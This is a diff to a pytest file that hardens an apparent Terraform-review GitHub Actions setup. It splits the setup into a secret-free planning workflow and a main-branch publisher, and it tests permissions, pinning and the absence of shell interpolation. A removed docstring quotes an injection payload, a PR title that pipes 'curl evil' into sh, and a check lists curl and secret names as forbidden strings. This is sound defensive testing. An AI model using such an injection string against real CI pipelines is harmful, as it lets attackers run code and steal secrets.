@@ -36,6 +36,7 @@ NOW = 1_790_000_000.0
 SECRET = "webhook-secret-not-real"
 TOKEN = "theseus-token-not-real"
 WORKFLOW = Path(".github/workflows/theseus.yml")
+PUBLISH = Path(".github/workflows/theseus-publish.yml")
 
 
 @pytest.fixture(scope="module")
@@ -484,11 +485,22 @@ def test_other_events_are_accepted_and_ignored(client: TestClient, fake: FakeGit
 
 
 # The Action -------------------------------------------------------------------------------------------------
+# Two workflows: `Theseus` plans the PR's own Terraform, so it is untrusted and holds no secrets; `Theseus
+# publish` runs from main's copy when it finishes, holds the token, and never runs PR code.
 
 
 @pytest.fixture(scope="module")
 def workflow() -> dict[Any, Any]:
     return yaml.safe_load(WORKFLOW.read_text(encoding="utf-8"))
+
+
+@pytest.fixture(scope="module")
+def publish() -> dict[Any, Any]:
+    return yaml.safe_load(PUBLISH.read_text(encoding="utf-8"))
+
+
+def steps_of(flow: dict[Any, Any]) -> list[dict[str, Any]]:
+    return [s for job in flow["jobs"].values() for s in job["steps"]]
 
 
 def test_the_action_runs_only_for_pull_requests_touching_the_world_root(workflow: dict[Any, Any]) -> None:
@@ -503,31 +515,67 @@ def test_the_action_runs_once_per_pr_with_read_only_permissions(workflow: dict[A
         "group": "theseus-${{ github.event.pull_request.number }}",
         "cancel-in-progress": True,
     }
-    assert workflow["permissions"] == {"contents": "read", "pull-requests": "read"}
+    assert workflow["permissions"] == {"contents": "read"}
 
 
-def test_no_run_step_interpolates_an_expression(workflow: dict[Any, Any]) -> None:
-    """A PR title like `"; curl evil | sh; "` must reach the shell as data, through env:, never as code."""
-    steps = [s for job in workflow["jobs"].values() for s in job["steps"]]
-    runs = [s["run"] for s in steps if "run" in s]
-    assert runs and all("${{" not in run for run in runs)
-    env = {k: v for s in steps for k, v in s.get("env", {}).items()}
-    assert env["PR_TITLE"] == "${{ github.event.pull_request.title }}"
-    assert env["PR_BODY"] == "${{ github.event.pull_request.body }}"
-    assert env["THESEUS_TOKEN"] == "${{ secrets.THESEUS_TOKEN }}"
-
-
-def test_the_action_plans_both_sides_runs_checkov_and_posts_to_analyze(workflow: dict[Any, Any]) -> None:
+def test_the_run_that_plans_pr_terraform_holds_no_secret_and_sends_nothing() -> None:
+    """Terraform plans the PR's own files, and a `data "external"` block runs during the plan. Anything it
+    plants (GITHUB_ENV, BASH_ENV, files) stays in a run with no secret and no way to reach the backend."""
     text = WORKFLOW.read_text(encoding="utf-8")
-    steps = [s for job in workflow["jobs"].values() for s in job["steps"]]
-    uses = [s["uses"] for s in steps if "uses" in s]
-    assert all(re.fullmatch(r"[\w.-]+/[\w.-]+@v\d+(\.\d+)*", u) for u in uses), uses
+    for needle in ("secrets.", "THESEUS_TOKEN", "THESEUS_URL", "/analyze", "curl"):
+        assert needle not in text, needle
+
+
+def test_the_action_plans_both_sides_runs_checkov_and_uploads_data(workflow: dict[Any, Any]) -> None:
+    text = WORKFLOW.read_text(encoding="utf-8")
+    steps = steps_of(workflow)
     setup = next(s for s in steps if s.get("uses", "").startswith("hashicorp/setup-terraform"))
     assert setup["with"]["terraform_version"] == "1.16.6"
     checkout = [s for s in steps if s.get("uses", "").startswith("actions/checkout")]
     assert [c["with"].get("path") for c in checkout] == [None, "base"]
-    for needle in ("terraform show -json", "checkov==3.3.29", "/analyze", "X-Theseus-Token", "jq -n"):
+    assert all(c["with"]["persist-credentials"] is False for c in checkout)
+    for needle in ("terraform show -json", "checkov==3.3.29", "jq -n"):
         assert needle in text, needle
+    upload = next(s for s in steps if s.get("uses", "").startswith("actions/upload-artifact"))
+    assert (upload["with"]["name"], upload["with"]["path"]) == ("theseus-review", "review.json")
+
+
+def test_the_publisher_runs_from_main_after_the_action_and_only_for_its_successes(
+    publish: dict[Any, Any],
+) -> None:
+    assert publish[True] == {"workflow_run": {"workflows": ["Theseus"], "types": ["completed"]}}
+    assert publish["permissions"] == {"actions": "read", "contents": "read"}
+    [job] = publish["jobs"].values()
+    assert "workflow_run.event == 'pull_request'" in job["if"]
+    assert "workflow_run.conclusion == 'success'" in job["if"]
+
+
+def test_the_publisher_never_runs_pr_code_and_takes_the_commit_from_its_event(
+    publish: dict[Any, Any],
+) -> None:
+    steps = steps_of(publish)
+    assert not any(s.get("uses", "").startswith("actions/checkout") for s in steps)
+    download = next(s for s in steps if s.get("uses", "").startswith("actions/download-artifact"))
+    assert download["with"]["run-id"] == "${{ github.event.workflow_run.id }}"
+    send = next(s for s in steps if "run" in s)
+    assert send["env"]["HEAD_SHA"] == "${{ github.event.workflow_run.head_sha }}"
+    assert send["env"]["THESEUS_TOKEN"] == "${{ secrets.THESEUS_TOKEN }}"
+    run = send["run"]
+    for needle in ("stat -c %s", "jq -e", "-L", "/analyze", "X-Theseus-Token", '--arg head_sha "$HEAD_SHA"'):
+        assert needle in run, needle
+    assert "head_sha: .head_sha" not in run  # never the artifact's commit
+
+
+def test_no_run_step_interpolates_an_expression(workflow: dict[Any, Any], publish: dict[Any, Any]) -> None:
+    """Values reach the shell as data, through env:, never as ${{ }} inside a run: script."""
+    for flow in (workflow, publish):
+        runs = [s["run"] for s in steps_of(flow) if "run" in s]
+        assert runs and all("${{" not in run for run in runs)
+
+
+def test_every_action_is_pinned_to_a_version(workflow: dict[Any, Any], publish: dict[Any, Any]) -> None:
+    uses = [s["uses"] for flow in (workflow, publish) for s in steps_of(flow) if "uses" in s]
+    assert uses and all(re.fullmatch(r"[\w.-]+/[\w.-]+@v\d+(\.\d+)*", u) for u in uses), uses
 
 
 def test_the_app_manifest_asks_for_what_spec_07_lists() -> None:
